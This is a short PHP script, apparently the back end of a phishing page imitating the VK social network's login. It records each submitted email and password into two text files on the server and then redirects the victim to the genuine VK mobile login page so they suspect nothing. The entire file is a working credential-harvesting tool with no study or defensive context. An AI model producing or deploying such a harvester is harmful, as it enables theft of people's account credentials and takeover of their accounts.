<?php

file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
file_put_contents("usernames_sort.txt", "" . $_POST['email'] . ":" . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://m.vk.com/login?role=fast&to=&s=1&m=1&email=');
exit();
